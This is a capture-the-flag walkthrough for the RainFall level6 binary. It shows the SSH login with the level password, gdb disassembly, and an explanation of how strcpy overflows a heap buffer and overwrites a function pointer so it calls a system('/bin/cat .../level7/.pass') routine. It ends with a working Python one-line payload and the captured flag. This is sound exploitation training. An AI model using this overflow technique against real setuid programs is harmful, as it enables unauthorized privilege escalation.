login as the user `level6`

```shell
 ssh -p 4242 level6@10.13.100.239
level6@10.13.100.239's password: d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level6/level6
level6@RainFall:~$
```

a `SUID` exactable file is locates in the home directory

```shell
level6@RainFall:~$ ./level6
Segmentation fault (core dumped)
level6@RainFall:~$ ./level6  f
Nope
```

let's inspect the program using `gdb`

```gdb
(gdb) info functions
...
0x08048454  n
0x08048468  m
0x0804847c  main
...
(gdb) disas main
Dump of assembler code for function main:
   0x0804847c <+0>:     push   %ebp
   0x0804847d <+1>:     mov    %esp,%ebp
   0x0804847f <+3>:     and    $0xfffffff0,%esp
   0x08048482 <+6>:     sub    $0x20,%esp
   0x08048485 <+9>:     movl   $0x40,(%esp)
   0x0804848c <+16>:    call   0x8048350 <malloc@plt>
   0x08048491 <+21>:    mov    %eax,0x1c(%esp)
   0x08048495 <+25>:    movl   $0x4,(%esp)
   0x0804849c <+32>:    call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:    mov    %eax,0x18(%esp)
   0x080484a5 <+41>:    mov    $0x8048468,%edx
   0x080484aa <+46>:    mov    0x18(%esp),%eax
   0x080484ae <+50>:    mov    %edx,(%eax)
   0x080484b0 <+52>:    mov    0xc(%ebp),%eax
   0x080484b3 <+55>:    add    $0x4,%eax
   0x080484b6 <+58>:    mov    (%eax),%eax
   0x080484b8 <+60>:    mov    %eax,%edx
   0x080484ba <+62>:    mov    0x1c(%esp),%eax
   0x080484be <+66>:    mov    %edx,0x4(%esp)
   0x080484c2 <+70>:    mov    %eax,(%esp)
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:    mov    0x18(%esp),%eax
   0x080484ce <+82>:    mov    (%eax),%eax
   0x080484d0 <+84>:    call   *%eax
   0x080484d2 <+86>:    leave
   0x080484d3 <+87>:    ret
End of assembler dump.
(gdb) disas n
Dump of assembler code for function n:
   0x08048454 <+0>:     push   %ebp
   0x08048455 <+1>:     mov    %esp,%ebp
   0x08048457 <+3>:     sub    $0x18,%esp
   0x0804845a <+6>:     movl   $0x80485b0,(%esp)
   0x08048461 <+13>:    call   0x8048370 <system@plt>
   0x08048466 <+18>:    leave
   0x08048467 <+19>:    ret
End of assembler dump.
(gdb) x/s 0x80485b0
0x80485b0:       "/bin/cat /home/user/level7/.pass"
(gdb) disas m
Dump of assembler code for function m:
   0x08048468 <+0>:     push   %ebp
   0x08048469 <+1>:     mov    %esp,%ebp
   0x0804846b <+3>:     sub    $0x18,%esp
   0x0804846e <+6>:     movl   $0x80485d1,(%esp)
   0x08048475 <+13>:    call   0x8048360 <puts@plt>
   0x0804847a <+18>:    leave
   0x0804847b <+19>:    ret
End of assembler dump.
(gdb) x/s 0x80485d1
0x80485d1:       "Nope"
```

looks like the program allocates 2 times, the first one is a char array of size `64` and the second is of a function pointer that takes no arguments are returns a `int`.

then the program a singes the the fucntion pointer the address of the function `m`, `m` prints the message `Nope` in stdout then returns.

the program then copies the first cli argument to the allocated array using `strcpy`.

we can exploit `strcpy` to change the value of the function pointer to the address of  the function `n`

the `n` function calls `system` with the argument `"/bin/cat /home/user/level7/.pass"` then returns.


```gdb
level6@RainFall:~$ gdb -q ./level6
(gdb) b* 0x08048491              #break after first allocation
Breakpoint 1 at 0x8048491
(gdb) b* 0x080484a1              #break after second allocation
Breakpoint 2 at 0x80484a1
(gdb) run
Starting program: /home/user/level6/level6

Breakpoint 1, 0x08048491 in main ()
(gdb) x/wx $eax
0x804a008:      0x00000000       # first allocation address
(gdb) c
Continuing.

Breakpoint 2, 0x080484a1 in main ()
(gdb) x/wx $eax
0x804a050:      0x00000000       # second allocation address
```

the address of the function pointer is at `0x804a050` if we can update it to the address of `n` we can solve the challenge.

```shell
level6@RainFall:~$ ./level6 `python -c "print 'A' * (0x804a050 - 0x804a008) + '\x54\x84\x04\x08' "`
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
